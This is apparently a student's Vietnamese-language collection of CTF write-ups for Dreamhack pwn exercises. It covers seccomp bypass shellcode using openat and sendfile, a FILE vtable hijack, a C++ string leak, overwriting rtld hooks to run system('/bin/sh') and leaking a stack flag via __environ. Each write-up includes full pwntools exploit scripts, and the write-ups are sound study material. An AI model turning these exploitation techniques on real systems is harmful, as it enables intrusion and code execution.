# Seccomp bypass 1

## source

```c
// Name: bypass_syscall.c
// Compile: gcc -o bypass_syscall bypass_syscall.c -lseccomp

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void sandbox() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);

  seccomp_load(ctx);
}

int main(int argc, char *argv[]) {
  void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  memset(shellcode, 0, 0x1000);

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sandbox();

  sc = (void *)shellcode;
  sc();
}
```

## Ý tưởng

- Lần trước chúng ta đã tìm hiểu seccomp với 2 chế độ, lần cũng tương tự là filter, chương trình cho phép, hoặc hạn chế một số syscall, trong bài này là nó sẽ hạn chế các syscall như `open, execve, execveat, write`
- dùng `seccomp tools` để kiểm tra chính xác hơn [link tải](https://github.com/david942j/seccomp-tools)
  ![image](https://user-images.githubusercontent.com/111769169/233795507-5115b118-3b0c-476b-b08c-5c57981fdac7.png)

- Ta thấy ta không thể bypass bằng cách `> 0x40000000` (hình như là các syscall 32 bit)
- Vậy không thể bypass bằng cách sử dụng syscall 32 bit thì ta sẽ bypass = cách sử dụng các syscall có chức năng tương tự như `open, write` trong đó có 2 syscall có chức năng tương tự là `openat và sendfile`
- openat để đọc file và sendlfile để hiển thị

## Khai thác

### tạo shell bằng pwntools

- do chương trình thực hiện shellcode
- Đường dẫn để đưa vào openat ta có thể đọc trong file Docker

```
ENV user bypass_syscall
ADD ./flag /home/$user/flag
```

```python
from pwn import *

#p = process('./bypass_syscall')
p = remote('host3.dreamhack.games',14198)

context.arch = 'x86_64'

pay = shellcraft.openat(0,'/home/bypass_syscall/flag')
pay += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(': ',asm(pay))
p.interactive()
```

### tạo shell bằng tay

- Đầu tiên syscall `sys_openat` ta sẽ set rdi = 0 và rsi = '/home/bypass_syscall/flag'
- Tiếp đến `sendfile` cần rdi = 1, rsi = rax, rdx = 0, r10 = 0x64

```python
from pwn import *

# p = process('./bypass_syscall')
p = remote('host3.dreamhack.games', 9464)

context.arch = 'x86_64'
# gdb.attach(p, gdbscript= '''
#            b*main+154
#            c
#            ''')
shellcode = asm("""
                push 0x67
                mov rax, 0x616c662f6c6c6163
                push rax
                mov rax, 0x7379735f73736170
                push rax
                mov rax, 0x79622f656d6f682f
                push rax

                mov rsi, rsp
                xor rdi, rdi
                xor rdx, rdx
                mov rax, 0x101
                syscall

                mov rdi, 0x1
                mov r10, 0x64
                xor edx, edx
                mov rsi, rax
                mov rax, 0x28
                syscall

                """)

# shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
# shellcode += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(b': ', (shellcode))
p.interactive()
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/233920506-446bc95b-2dfb-4e0b-8af1-1e0db8040867.png)

```python
from pwn import *

# p = process('./bypass_syscall')
p = remote('host3.dreamhack.games', 22430)

context.arch = 'x86_64'
# gdb.attach(p, gdbscript= '''
#            b*main+154
#            c
#            ''')
shellcode = asm("""
                push 0x67
                mov rax, 0x616c662f6c6c6163
                push rax
                mov rax, 0x7379735f73736170
                push rax
                mov rax, 0x79622f656d6f682f
                push rax

                mov rsi, rsp
                xor rdi, rdi
                xor rdx, rdx
                mov rax, 0x101
                syscall

                mov rdi, 0x1
                mov r10, 0x64
                xor edx, edx
                mov rsi, rax
                mov rax, 0x28
                syscall

                """)

# shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
# shellcode += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(b': ', (shellcode))
p.interactive()
```

# iofile_vtable

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char name[8];
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    int idx = 0;
    int sel;

    initialize();

    printf("what is your name: ");
    read(0, name, 8);
    while(1) {
        printf("1. print\n");
        printf("2. error\n");
        printf("3. read\n");
        printf("4. chance\n");
        printf("> ");

        scanf("%d", &sel);
        switch(sel) {
            case 1:
                printf("GOOD\n");
                break;
            case 2:
                fprintf(stderr, "ERROR\n");
                break;
            case 3:
                fgetc(stdin);
                break;
            case 4:
                printf("change: ");
                read(0, stderr + 1, 8);
                break;
            default:
                break;
            }
    }
    return 0;
}
```

## Ý tưởng

- Ban đầu em tính ở option 4 ta sẽ nhập vào địa chỉ của `get_shell` và chọn option 2 để thực thi đến hàm `get_shell` nhưng có vẻ nó không được

- Em tham khảo wu thì em nhận thấy ở `stderr + 1` chứa địa chỉ

```
gef➤  p stderr+1
$6 = (FILE *) 0x7ffff7fa3778 <_IO_2_1_stderr_+216>
```

- Ở địa chỉ `stderr+1` chứa địa chỉ của `_IO_file_jump`

```
gef➤  x/xg 0x7ffff7fa3778
0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   0x00007ffff7f9f600
gef➤  x/xg 0x00007ffff7f9f600
0x7ffff7f9f600 <_IO_file_jumps>:        0x0000000000000000
```

- Khi này em kiểm tra hàm `_IO_file_jump` ta thấy như sau

  - Khi chọn option 2 hàm fprintf sẽ thực thi `__xsputn = 0x7ffff7e14680 <_IO_new_file_xsputn>,`
  - vậy nếu như ta đưa địa chỉ shell vào `name` sau đó ở option 4 ta đưa địa chỉ name vào và chọn option 2 nó sẽ thực thi `__xsputn`

- Để rõ hơn ta sẽ như sau, ta có chức năng để sửa địa chỉ `+216` thành một địa chỉ ví dụ là `0x1122334455667788`

- Khi này ta có như sau
  `0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   0x1122334455667788`
- Vì nó không kiểm tra đia chỉ `0x1122334455667788` có phải là địa chỉ của `_IO_file_jumps` không mà nó cứ truy cập vào địa chỉ đó và nó nhớ offset của `__xsputn` là `?` và nó sẽ lấy `0x1122334455667788 + ?` và thực thi tại địa chỉ được cộng thêm offset

- Oke vậy nếu ta đưa địa chỉ `shell - ?` vào thì không được vì

```
gef➤  x/xg 0x7ffff7fa3778
0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   shell - ?
gef➤  x/xg 0x00007ffff7f9f600
0x7ffff7f9f600 <_IO_file_jumps+?>:        shell

shell: ????
```

- Nó khá khó giải thích, em chỉ hiểu chỗ `shell: ????` nó sẽ thực thi `????` là 1 địa chỉ. Vậy ta sẽ thông qua `name` để đưa shell vào, nó sẽ hoạt động như sau

```
gef➤  x/xg 0x7ffff7fa3778
0x7ffff7fa3778 <_IO_2_1_stderr_+216>:   name - ?
gef➤  x/xg 0x00007ffff7f9f600
0x7ffff7f9f600 <_IO_file_jumps+?>:        name

name: shell
```

- Đó trông có vẻ ổn áp hơn r =))
- Bây giờ tìm `?` như nào =))
- Ta biết nó hoạt động dựa vào offset trong `_IO_file_jumps`
- Khi ta leak được nhiều hơn

```
gef➤  x/30xg 0x00007ffff7f9f600
0x7ffff7f9f600 <_IO_file_jumps>:        0x0000000000000000      0x0000000000000000
0x7ffff7f9f610 <_IO_file_jumps+16>:     0x00007ffff7e15070      0x00007ffff7e15e40
0x7ffff7f9f620 <_IO_file_jumps+32>:     0x00007ffff7e15b30      0x00007ffff7e16de0
0x7ffff7f9f630 <_IO_file_jumps+48>:     0x00007ffff7e18300      0x00007ffff7e14680
0x7ffff7f9f640 <_IO_file_jumps+64>:     0x00007ffff7e14330      0x00007ffff7e13960
0x7ffff7f9f650 <_IO_file_jumps+80>:     0x00007ffff7e17530      0x00007ffff7e13620
0x7ffff7f9f660 <_IO_file_jumps+96>:     0x00007ffff7e134b0      0x00007ffff7e07b90
0x7ffff7f9f670 <_IO_file_jumps+112>:    0x00007ffff7e149b0      0x00007ffff7e13f40
0x7ffff7f9f680 <_IO_file_jumps+128>:    0x00007ffff7e136f0      0x00007ffff7e13610
0x7ffff7f9f690 <_IO_file_jumps+144>:    0x00007ffff7e13f30      0x00007ffff7e184a0
0x7ffff7f9f6a0 <_IO_file_jumps+160>:    0x00007ffff7e184b0      0x0000000000000000
0x7ffff7f9f6b0: 0x0000000000000000      0x0000000000000000
0x7ffff7f9f6c0 <_IO_str_jumps>: 0x0000000000000000      0x0000000000000000
0x7ffff7f9f6d0 <_IO_str_jumps+16>:      0x00007ffff7e189f0      0x00007ffff7e18610
0x7ffff7f9f6e0 <_IO_str_jumps+32>:      0x00007ffff7e185b0      0x00007ffff7e16de0

$7 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7e15070 <_IO_new_file_finish>,
  __overflow = 0x7ffff7e15e40 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7e15b30 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7e16de0 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7e18300 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7e14680 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7e14330 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7e13960 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7e17530 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7e13620 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7e134b0 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7e07b90 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7e149b0 <__GI__IO_file_read>,
  __write = 0x7ffff7e13f40 <_IO_new_file_write>,
  __seek = 0x7ffff7e136f0 <__GI__IO_file_seek>,
  __close = 0x7ffff7e13610 <__GI__IO_file_close>,
  __stat = 0x7ffff7e13f30 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7e184a0 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7e184b0 <_IO_default_imbue>
}
```

- Ta thấy `__xsputn = 0x7ffff7e14680 <_IO_new_file_xsputn>,` so với khung bên trên thì tại `0x7ffff7f9f630 <_IO_file_jumps+48>:     0x00007ffff7e18300      0x00007ffff7e14680` có đúng địa chỉ của `__xsputn` và offset là 56 (mãi sau em mới hiểu cái này). Vậy `?` sẽ là 56

## Kết quả

```python
from pwn import *
# p = process('./iofile_vtable')
p = remote('host3.dreamhack.games', 8581)
get_shell_addr = 0x40094a
name_addr = 0x00000000006010d0

# gdb.attach(p, gdbscript='''
#            b*main+228
#            c

#            ''')
input()

p.recvuntil("what is your name: ")
p.sendline(p64(get_shell_addr))

p.recvuntil('> ')
p.sendline("2")

p.recvuntil('> ')
p.sendline("4")

p.recvuntil('change: ')
p.sendline(p64(name_addr- 0x38))

p.interactive()
```

![image](https://user-images.githubusercontent.com/111769169/233936703-411a8ce0-45ba-4770-85cf-6075af9bf3e8.png)

# cpp-string

## Source

```cpp
//g++ -o cpp_string cpp_string.cpp
#include <iostream>
#include <fstream>
#include <csignal>
#include <unistd.h>
#include <stdlib.h>

char readbuffer[64] = {0, };
char flag[64] = {0, };
std::string writebuffer;

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int read_file(){
	std::ifstream is ("test", std::ifstream::binary);
	if(is.is_open()){
        	is.read(readbuffer, sizeof(readbuffer));
		is.close();

		std::cout << "Read complete!" << std::endl;
        	return 0;
	}
	else{
        	std::cout << "No testfile...exiting.." << std::endl;
        	exit(0);
	}
}

int write_file(){
	std::ofstream of ("test", std::ifstream::binary);
	if(of.is_open()){
		std::cout << "Enter file contents : ";
        	std::cin >> writebuffer;
		of.write(writebuffer.c_str(), sizeof(readbuffer));
                of.close();
		std::cout << "Write complete!" << std::endl;
        	return 0;
	}
	else{
		std::cout << "Open error!" << std::endl;
		exit(0);
	}
}

int read_flag(){
        std::ifstream is ("flag", std::ifstream::binary);
        if(is.is_open()){
                is.read(flag, sizeof(readbuffer));
                is.close();
                return 0;
        }
        else{
		std::cout << "You must need flagfile.." << std::endl;
                exit(0);
        }
}

int show_contents(){
	std::cout << "contents : ";
	std::cout << readbuffer << std::endl;
	return 0;
}



int main(void) {
    initialize();
    int selector = 0;
    while(1){
    	std::cout << "Simple file system" << std::endl;
    	std::cout << "1. read file" << std::endl;
    	std::cout << "2. write file" << std::endl;
	std::cout << "3. show contents" << std::endl;
    	std::cout << "4. quit" << std::endl;
    	std::cout << "[*] input : ";
	std::cin >> selector;

	switch(selector){
		case 1:
			read_flag();
			read_file();
			break;
		case 2:
			write_file();
			break;
		case 3:
			show_contents();
			break;
		case 4:
			std::cout << "BYEBYE" << std::endl;
			exit(0);
	}
    }
}
```

## Ý tưởng

- Bài này ở phần hướng dẫn người ta có nói là hàm `is.read` tương tự như `read` trong C, thì `read` nó sẽ đọc dữ liệu nhưng không tự động thêm null byte vào chuỗi đã đọc. Ví dụ: "aaaa", read sẽ đọc đúng "aaaa" và không có null byte ở cuối chuỗi, khi muốn xuất ra màn hình thì các hàm như puts, printf sẽ tự động gắn null byte.
- Vậy ở bài này ta sẽ nhập full 64 byte ở `readbuffer` và khi in `readbuffer` nó sẽ gắn liền với `flag`

## Khai thác

- Đầu tiên ta nhập 1 để đọc file flag và lưu vào flag
  ![image](https://user-images.githubusercontent.com/111769169/233940744-4478b120-6a23-4c35-9d6f-7475f765fdbf.png)

- Sau đó ở option 2 để nhập context thì ta nhập 64 byte
  ![image](https://user-images.githubusercontent.com/111769169/233940969-6e8f541d-0ae8-4806-aaa6-84fc62a980dd.png)

- Cuối cùng option 3 để in ra `readbuffer` nối với flag
  ![image](https://user-images.githubusercontent.com/111769169/233941206-2bde7c62-9e67-4ec7-9c08-2bef2fc60671.png)

# overwrite rtld

## source

```c
// Name: ow_rtld.c
// Compile: gcc -o ow_rtld ow_rtld.c

#include <stdio.h>
#include <stdlib.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
      	return 0;
    }
  }
  return 0;
}
```

## Ý tưởng

- Bài này cho phép ta sửa giá trị ở một địa chỉ
- Tương tự như đợt trước, chỉ khác là ở `_dl_load_lock` không có chuỗi /bin/sh
- Ở đây em thử one_gadget ở `_dl_rtld_lock_recursive` nhưng có vẻ không được (hoặc do em làm sai =))), do đó lần ta sẽ gọi hàm system trong file libc

## Khai thác

- Đầu tiên ta sẽ tính libc base, ld base

```python
p.recvuntil(b'stdout: ')
libc_leak = int(p.recv(14), 16)
libc.address = libc_leak - 0x3ec760
info("libc base: " + hex(libc.address))

ld.address = libc.address + 0x3f1000
info("ld base: " + hex(ld.address))
```

- Tiếp theo ta đưa chuỗi /bin/sh vào `_dl_load_lock`

```python
sla(b"> ", b'1')
# _dl_load_lock
payload = (ld.sym['_rtld_global'] + 2312)
sla(b"addr: ", str(payload))

payload = u64('/bin/sh\0')
sla(b"data: ", str(payload))
```

- Cuối cùng ta đưa system vào `_dl_rtld_lock_recursive`

```python
sla(b"> ", b'1')
# _dl_rtld_lock_recursive
payload = (ld.sym['_rtld_global'] + 3840)
sla(b"addr: ", str(payload))

payload = libc.sym["system"]
sla(b"data: ", str(payload))

sla(b"> ", b'0')
```

## Kết quả

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('ow_rtld_patched', checksec=False)
libc = ELF('libc-2.27.so_18.04.3', checksec=False)
ld = ELF('ld-2.27.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main +101

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('host3.dreamhack.games', 13966)
else:
    p = process(exe.path)

GDB()
p.recvuntil(b'stdout: ')
libc_leak = int(p.recv(14), 16)
libc.address = libc_leak - 0x3ec760
info("libc base: " + hex(libc.address))

ld.address = libc.address + 0x3f1000
info("ld base: " + hex(ld.address))

sla(b"> ", b'1')
# _dl_load_lock
payload = (ld.sym['_rtld_global'] + 2312)
sla(b"addr: ", str(payload))

payload = u64('/bin/sh\0')
sla(b"data: ", str(payload))

sla(b"> ", b'1')
# _dl_rtld_lock_recursive
payload = (ld.sym['_rtld_global'] + 3840)
sla(b"addr: ", str(payload))

payload = libc.sym["system"]
sla(b"data: ", str(payload))

sla(b"> ", b'0')
p.interactive()
```

# \_\_environ

## Source

```c
// Name: environ.c
// Compile: gcc -o environ environ.c

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void sig_handle() {
  exit(0);
}
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  signal(SIGALRM, sig_handle);
  alarm(5);
}

void read_file() {
  char file_buf[4096];

  int fd = open("/home/environ_exercise/flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}
```

## Ý tưởng

- Ở đây ta thấy hàm `read_file` khá là lạ
- Ta thấy nó đọc flag vào `file_buf`
- Chương trình cho ta nhập vào một địa chỉ và nó sẽ in ra dữ liệu bên trong địa chỉ đó
- Vậy ta sẽ coi địa chỉ `file_buf` ở đâu và ta sẽ sử dụng chức năng của chương trình để in flag

## Khai thác

- Đầu tiên ta tính libc base và địa chỉ environ

```python
p.recvuntil(b": ")

stdout = int(p.recv(14), 16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
libc_env = libc.sym['__environ']

info(hex(libc.address))
info(hex(libc_env))
```

- Lý do vì có vẻ `__environ` chứa địa chỉ stack
  ![image](https://user-images.githubusercontent.com/111769169/233952313-d7531214-88b0-4dbe-8871-931c4206b6ac.png)

- Tiếp theo ta in giá trị mà `__environ` đang chứa

```python
sla(b"> ", b"1")
sla(b"Addr: ", str(libc_env))
environ = u64(p.recv(6) + b"\0\0")
```

- Bây giờ ta cần tính offset từ flag đến stack mình leak được ở environ
- Muốn biết flag nằm ở đâu ta dừng ở read trong hàm `read_file`

```
read@plt (
   $rdi = 0x00000000000003,
   $rsi = 0x007fffffffc7c0 → 0x0000000000000000,
   $rdx = 0x00000000000fff,
   $rcx = 0x007fffffffc7c0 → 0x0000000000000000
)
```

- Ta thấy flag ở thanh rsi tại địa chỉ 0x007fffffffc7c0, ta ni tiếp để kiểm tra stack
  ![image](https://user-images.githubusercontent.com/111769169/233954859-26779e0e-d44a-4396-9449-409101bf31ee.png)

- Cuối cùng tính offset

```python
sla(b"> ", b"1")
flag_addr = environ - 0x1538

print(hex(flag_addr))
p.sendlineafter("Addr: ", str(flag_addr))
```

## Kết quả

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('environ_exercise_patched', checksec=False)
libc = ELF('libc-2.27-2.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+73
                b*main+90

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('host3.dreamhack.games', 19685)
else:
    p = process(exe.path)

GDB()
p.recvuntil(b": ")

stdout = int(p.recv(14), 16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
libc_env = libc.sym['__environ']

info(hex(libc.address))
info(hex(libc_env))

sla(b"> ", b"1")
sla(b"Addr: ", str(libc_env))
environ = u64(p.recv(6) + b"\0\0")
sla(b"> ", b"1")
flag_addr = environ - 0x1538

print(hex(flag_addr))
p.sendlineafter("Addr: ", str(flag_addr))
# p.sendlineafter("> ", "1")

p.interactive()
```